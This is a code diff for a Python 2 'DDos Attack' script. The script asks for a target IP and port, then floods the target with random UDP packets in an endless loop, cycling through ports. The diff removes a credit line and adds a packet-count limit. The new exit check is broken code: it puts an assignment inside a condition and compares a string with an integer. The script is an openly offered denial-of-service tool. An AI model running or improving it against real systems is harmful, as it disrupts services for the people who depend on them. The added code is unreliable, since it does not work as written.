@@ -19,11 +19,11 @@ bytes = random._urandom(1490)
 
 os.system("clear")
 os.system("figlet DDos Attack")
-print
-print "COPYCOD   : PQ"
+
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
+count = raw_input("COUNT Target : ")
 
 os.system("clear")
 os.system("figlet Attack Starting")
@@ -45,4 +45,5 @@ while True:
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
+     if count = sent: exit
 
